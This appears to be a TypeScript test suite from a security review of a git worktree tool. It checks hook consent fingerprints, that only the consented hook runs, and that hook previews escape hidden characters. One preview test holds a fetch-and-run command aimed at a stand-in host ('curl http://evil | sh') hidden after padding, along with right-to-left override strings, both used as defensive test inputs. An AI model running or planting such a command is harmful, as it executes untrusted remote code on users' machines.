// SPDX-License-Identifier: GPL-3.0-or-later
import { describe, it, expect, afterEach } from "vitest";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import { addWorktree } from "../src/worktrees";
import { buildHookPreview, detectPostCheckoutHook } from "../src/worktreeHook";
import { listWorktrees } from "../src/worktreeList";
import { visibleUntrustedText } from "../src/worktreeParse";
import { cleanup, fileExists, git, makeRepoInTempParent, snapshotTree } from "./testRepo";

/** Security review M1 (hook consent) and M2 (preview honesty) for specs/worktrees.md FR-644. */
const dirs: string[] = [];
afterEach(async () => {
  while (dirs.length) await cleanup(dirs.pop()!);
});

const fwd = (p: string) => p.replace(/\\/g, "/");

async function repoWithHooks(hooks: Record<string, string>) {
  const f = await makeRepoInTempParent();
  dirs.push(f.parent);
  await git(f.repo, ["branch", "b1"]);
  const outside = path.join(f.parent, "outside");
  await fs.mkdir(outside);
  const hooksDir = path.join(f.repo, ".git", "hooks");
  await fs.mkdir(hooksDir, { recursive: true });
  for (const [name, body] of Object.entries(hooks)) {
    await fs.writeFile(path.join(hooksDir, name), body);
    await fs.chmod(path.join(hooksDir, name), 0o755);
  }
  return { ...f, outside, hooksDir };
}

const sentinelHook = (sentinel: string) => `#!/bin/sh\necho "$0" >> "${fwd(sentinel)}"\n`;

async function present(repo: string) {
  const info = await detectPostCheckoutHook(repo);
  if (!info.present) throw new Error("expected a hook");
  return info;
}

describe("fingerprint (M1b)", () => {
  it("changes with content (also past 1 MB), a new sibling hook, the exec bit and core.hooksPath; not with .sample files", async () => {
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho one\n" });
    const base = (await present(f.repo)).fingerprint;

    await fs.writeFile(path.join(f.hooksDir, "post-checkout.sample"), "sample");
    expect((await present(f.repo)).fingerprint).toBe(base);

    await fs.writeFile(path.join(f.hooksDir, "reference-transaction"), "#!/bin/sh\n");
    const withSibling = await present(f.repo);
    expect(withSibling.fingerprint).not.toBe(base);
    expect(withSibling.otherHooks).toEqual(["reference-transaction"]);
    await fs.rm(path.join(f.hooksDir, "reference-transaction"));
    expect((await present(f.repo)).fingerprint).toBe(base);

    // Content change only beyond the first megabyte: a capped hash would miss it.
    const big = `#!/bin/sh\n${"# pad\n".repeat(200_000)}echo A\n`;
    await fs.writeFile(path.join(f.hooksDir, "post-checkout"), big);
    const a = await present(f.repo);
    await fs.writeFile(path.join(f.hooksDir, "post-checkout"), big.replace("echo A", "echo B"));
    const b = await present(f.repo);
    expect(a.size).toBeGreaterThan(1024 * 1024);
    expect(a.contentSha256).not.toBe(b.contentSha256);
    expect(a.fingerprint).not.toBe(b.fingerprint);

    const elsewhere = path.join(f.parent, "shared-hooks");
    await fs.mkdir(elsewhere);
    await fs.copyFile(path.join(f.hooksDir, "post-checkout"), path.join(elsewhere, "post-checkout"));
    await git(f.repo, ["config", "core.hooksPath", fwd(elsewhere)]);
    expect((await present(f.repo)).fingerprint).not.toBe(b.fingerprint);
  });

  it("changes with the executable bit (POSIX)", async (ctx) => {
    if (process.platform === "win32") return ctx.skip();
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho x\n" });
    const exec = await present(f.repo);
    await fs.chmod(path.join(f.hooksDir, "post-checkout"), 0o644);
    const plain = await present(f.repo);
    expect(exec.executable).toBe(true);
    expect(plain.executable).toBe(false);
    expect(plain.fingerprint).not.toBe(exec.fingerprint);
  });
});

describe("consent is re-checked right before the spawn (M1a)", () => {
  it("refuses with hookChanged when the hook changed after the fingerprint was shown, and creates nothing", async () => {
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho one\n" });
    const shown = (await present(f.repo)).fingerprint;
    await fs.writeFile(path.join(f.hooksDir, "post-checkout"), "#!/bin/sh\necho CHANGED\n");
    const before = await snapshotTree(f.parent);
    const res = await addWorktree(f.repo, path.join(f.worktreesDir, "w"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true, expectedHookFingerprint: shown });
    expect(res).toMatchObject({ ok: false, reason: "hookChanged" });
    expect(await snapshotTree(f.parent)).toEqual(before);
  });

  it("a new sibling hook after consent also invalidates it", async () => {
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho one\n" });
    const shown = (await present(f.repo)).fingerprint;
    await fs.writeFile(path.join(f.hooksDir, "reference-transaction"), "#!/bin/sh\n");
    const res = await addWorktree(f.repo, path.join(f.worktreesDir, "w"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true, expectedHookFingerprint: shown });
    expect(res).toMatchObject({ ok: false, reason: "hookChanged" });
  });

  it("runPostCheckoutHook without a fingerprint is refused", async () => {
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho one\n" });
    const res = await addWorktree(f.repo, path.join(f.worktreesDir, "w"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true });
    expect(res).toMatchObject({ ok: false, reason: "hookFingerprintRequired" });
    expect(await fileExists(f.worktreesDir)).toBe(false);
  });

  it("consent for a hook that no longer exists is hookChanged", async () => {
    const f = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho one\n" });
    const shown = (await present(f.repo)).fingerprint;
    await fs.rm(path.join(f.hooksDir, "post-checkout"));
    const res = await addWorktree(f.repo, path.join(f.worktreesDir, "w"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true, expectedHookFingerprint: shown });
    expect(res).toMatchObject({ ok: false, reason: "hookChanged" });
  });

  it("a relative core.hooksPath is flagged and consent for it is refused (hooksPathRelative)", async () => {
    const f = await repoWithHooks({});
    await fs.mkdir(path.join(f.repo, ".husky"));
    await fs.writeFile(path.join(f.repo, ".husky", "post-checkout"), "#!/bin/sh\necho x\n");
    await git(f.repo, ["config", "core.hooksPath", ".husky"]);
    const info = await present(f.repo);
    expect(info.hooksPathRelative).toBe(true);
    const res = await addWorktree(f.repo, path.join(f.worktreesDir, "w"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true, expectedHookFingerprint: info.fingerprint });
    expect(res).toMatchObject({ ok: false, reason: "hooksPathRelative" });
    expect(await fileExists(f.worktreesDir)).toBe(false);
  });
});

describe("only the consented hook runs (M1c)", () => {
  async function planted() {
    const f = await repoWithHooks({});
    const s = (n: string) => path.join(f.outside, `sentinel-${n}`);
    for (const n of ["post-checkout", "reference-transaction", "post-index-change"]) {
      await fs.writeFile(path.join(f.hooksDir, n), sentinelHook(s(n)));
      await fs.chmod(path.join(f.hooksDir, n), 0o755);
    }
    return { ...f, s };
  }

  it("positive control: plain git fires all three on `worktree add -b`", async () => {
    const f = await planted();
    await git(f.repo, ["worktree", "add", "-q", path.join(f.worktreesDir, "control"), "-b", "ctl"]);
    for (const n of ["post-checkout", "reference-transaction", "post-index-change"]) expect(await fileExists(f.s(n)), n).toBe(true);
  });

  it("with consent only post-checkout runs, once; reference-transaction and post-index-change stay silent", async () => {
    const f = await planted();
    const info = await present(f.repo);
    expect(info.otherHooks).toEqual(["post-index-change", "reference-transaction"]);
    const dest = path.join(f.worktreesDir, "consented");
    const res = await addWorktree(f.repo, dest, { kind: "newBranch", branch: "consented", startPoint: "HEAD" }, { runPostCheckoutHook: true, expectedHookFingerprint: info.fingerprint });
    expect(res).toMatchObject({ ok: true, warning: null });
    expect((await fs.readFile(f.s("post-checkout"), "utf8")).trim().split(/\r?\n/)).toHaveLength(1);
    expect(await fileExists(f.s("reference-transaction"))).toBe(false);
    expect(await fileExists(f.s("post-index-change"))).toBe(false);
    expect(await fileExists(path.join(dest, "a.txt"))).toBe(true);
  });

  it("the hook runs as a private copy (shebang works), and the copy is removed afterwards", async () => {
    const f = await planted();
    const info = await present(f.repo);
    await addWorktree(f.repo, path.join(f.worktreesDir, "copy"), { kind: "branch", branch: "b1" }, { runPostCheckoutHook: true, expectedHookFingerprint: info.fingerprint });
    const ran = (await fs.readFile(f.s("post-checkout"), "utf8")).trim();
    expect(ran).toContain("githydra-hook-");
    expect(ran).not.toContain(path.join(f.repo, ".git").replace(/\\/g, "/"));
    const leftovers = (await fs.readdir(require("node:os").tmpdir())).filter((n) => n.startsWith("githydra-hook-"));
    expect(leftovers).toEqual([]);
  });

  it("without consent nothing runs", async () => {
    const f = await planted();
    await addWorktree(f.repo, path.join(f.worktreesDir, "plain"), { kind: "newBranch", branch: "plain", startPoint: "HEAD" });
    for (const n of ["post-checkout", "reference-transaction", "post-index-change"]) expect(await fileExists(f.s(n)), n).toBe(false);
  });
});

describe("preview honesty (M2)", () => {
  it("makes bidi, zero-width and control characters visible escapes", () => {
    const evil = "a‮b⁦c​d⁠e﻿؜f\u0007g";
    const shown = visibleUntrustedText(evil);
    expect(shown).toBe("a\\u{202e}b\\u{2066}c\\u{200b}d\\u{2060}e\\u{feff}\\u{61c}f\\u{7}g");
    for (const cp of [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200b, 0x200f, 0x2060, 0x2064, 0xfeff, 0x061c]) {
      expect(visibleUntrustedText(String.fromCodePoint(cp)), cp.toString(16)).toMatch(/^\\u\{[0-9a-f]+\}$/);
    }
  });

  it("lock reasons are escaped too", async () => {
    const f = await makeRepoInTempParent();
    dirs.push(f.parent);
    const wt = path.join(f.parent, "locked");
    await git(f.repo, ["worktree", "add", "-q", wt, "-b", "locked"]);
    await git(f.repo, ["worktree", "lock", "--reason", "legit‮evil", wt]);
    const entry = (await listWorktrees(f.repo)).entries.find((e) => e.locked)!;
    expect(entry.lockReason).toBe("legit\\u{202e}evil");
  });

  it("the hook preview shows RLO escaped, flags >20 lines, and wraps a 5,000-character line honestly", async () => {
    const rlo = await repoWithHooks({ "post-checkout": "#!/bin/sh\necho ‮hidden\n" });
    const info = await present(rlo.repo);
    expect(info.preview).toContain("\\u{202e}");
    expect(info.preview).not.toContain("‮");

    const many = await repoWithHooks({ "post-checkout": `#!/bin/sh\n${Array.from({ length: 40 }, (_, i) => `echo ${i}`).join("\n")}\n` });
    const m = await present(many.repo);
    expect(m.previewLineCount).toBe(41);
    expect(m.previewTruncated).toBe(true);
    expect(m.preview.split("\n")).toHaveLength(20);

    const wide = await repoWithHooks({ "post-checkout": `#!/bin/sh\necho ${"x".repeat(5000)}\n` });
    const w = await present(wide.repo);
    expect(w.previewTruncated).toBe(true);
    expect(w.previewLineCount).toBe(2);
    expect(w.preview.split("\n").every((row) => row.length <= 120)).toBe(true);
  });

  it("a payload after 300 spaces is visible, not scrolled out of view", () => {
    const { preview, truncated } = buildHookPreview(`echo ok${" ".repeat(300)}curl http://evil | sh\n`, true);
    expect(preview).toContain("[300 spaces]");
    expect(preview).toContain("curl http://evil | sh");
    expect(truncated).toBe(false);
  });

  it("a file larger than the preview window is flagged truncated", async () => {
    const f = await repoWithHooks({ "post-checkout": `#!/bin/sh\n${"# pad\n".repeat(30_000)}` });
    const info = await present(f.repo);
    expect(info.previewTruncated).toBe(true);
    expect(info.previewLineCount).toBe(30_001);
  });
});
